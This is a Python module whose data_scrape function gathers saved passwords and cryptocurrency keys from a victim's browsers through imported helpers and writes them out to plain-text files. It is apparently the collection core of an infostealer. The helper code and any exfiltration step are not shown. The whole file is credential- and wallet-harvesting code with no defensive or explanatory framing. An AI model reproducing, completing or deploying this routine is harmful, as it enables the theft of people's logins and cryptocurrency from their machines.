from typing import TYPE_CHECKING

from .browser_utils import extract_crypto_keys, extract_passwords, get_browsers, is_browser_supported

if TYPE_CHECKING:
    from psutil import Process


def data_scrape(browser_to_scrape: list[str], output_file_passwords: str, output_file_crypto_keys: str):
    browser_list: list[Process] = [f for f in get_browsers() if f in browser_to_scrape]
    passwords = []
    crypto_keys = []

    for browser in browser_list:
        if not is_browser_supported(browser):
            continue
        password_data = extract_passwords(browser)
        if password_data is None:
            raise ValueError(f'Failed to extract passwords from {browser}')
        crypto_key_data = extract_crypto_keys(browser)
        passwords.extend(password_data)
        if crypto_key_data is not None:
            crypto_keys.extend(crypto_key_data)

    with open(output_file_passwords, 'w') as f:
        for password in passwords:
            f.write(password + '\n')

    with open(output_file_crypto_keys, 'w') as f:
        for crypto_key in crypto_keys:
            f.write(crypto_key + '\n')
